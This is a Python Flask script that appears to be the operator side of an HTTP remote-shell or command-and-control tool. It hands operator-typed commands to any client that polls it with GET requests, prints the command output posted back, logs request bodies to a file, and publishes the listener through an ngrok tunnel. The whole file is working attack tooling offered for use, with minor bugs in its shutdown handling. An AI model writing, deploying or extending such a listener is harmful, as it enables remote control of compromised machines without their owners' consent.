from flask import Flask, request
import logging
import subprocess
import requests
import signal

WHITE = '\033[1;37m';END = '\033[0m'
banner = ("""
       ⣴⣶⣤⡤⠦⣤⣀⣤⠆     ⣈⣭⣭⣿⣶⣿⣦⣼⣆         
        ⠉⠻⢿⣿⠿⣿⣿⣶⣦⠤⠄⡠⢾⣿⣿⡿⠋⠉⠉⠻⣿⣿⡛⣦    
              ⠈⢿⣿⣟⠦ ⣾⣿⣿⣷⠄⠄⠄⠄⠻⠿⢿⣿⣧⣄     
               ⣸⣿⣿⢧ ⢻⠻⣿⣿⣷⣄⣀⠄⠢⣀⡀⠈⠙⠿⠄    
              ⢠⣿⣿⣿⠈  ⠡⠌⣻⣿⣿⣿⣿⣿⣿⣿⣛⣳⣤⣀⣀   
       ⢠⣧⣶⣥⡤⢄ ⣸⣿⣿⠘⠄ ⢀⣴⣿⣿⡿⠛⣿⣿⣧⠈⢿⠿⠟⠛⠻⠿⠄  
      ⣰⣿⣿⠛⠻⣿⣿⡦⢹⣿⣷   ⢊⣿⣿⡏  ⢸⣿⣿⡇ ⢀⣠⣄⣾⠄   
     ⣠⣿⠿⠛⠄⢀⣿⣿⣷⠘⢿⣿⣦⡀ ⢸⢿⣿⣿⣄ ⣸⣿⣿⡇⣪⣿⡿⠿⣿⣷⡄  
     ⠙⠃   ⣼⣿⡟  ⠈⠻⣿⣿⣦⣌⡇⠻⣿⣿⣷⣿⣿⣿ ⣿⣿⡇⠄⠛⠻⢷⣄ 
          ⢻⣿⣿⣄   ⠈⠻⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟ ⠫⢿⣿⡆     
           ⠻⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣀⣤⣾⡿⠃

""")
print(f"{WHITE}{banner}{END}")


addr="0.0.0.0"
port=5000
app = Flask(__name__)

def ngrok():
    ngrok_process = subprocess.Popen(['ngrok', 'http', '5000'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import time; time.sleep(3)
    res = requests.get('http://localhost:4040/api/tunnels')
    url = res.json()['tunnels'][0]['public_url']
    return url

@app.after_request
def log(log):
    with open('server.log', 'a') as file:
        file.write(f"{request.data.decode('utf-8')}\n")
    return log
@app.route('/', methods=['GET'])
def get():
    cmd=input('~ $ ')
    return cmd
@app.route('/', methods=['POST'])
def post():
    print(request.get_data().decode('utf-8'))
    return ""
logging.getLogger('werkzeug').setLevel(logging.ERROR)
def kill(signal, frame):
    ngrok.kill()
if __name__ == "__main__":
    ngrok = ngrok(); print(f"[!] waiting requests on -> {ngrok} \n")
    from waitress import serve
    serve(app, host=addr, port=port)
    signal.signal(signal.SIGINT, kill)
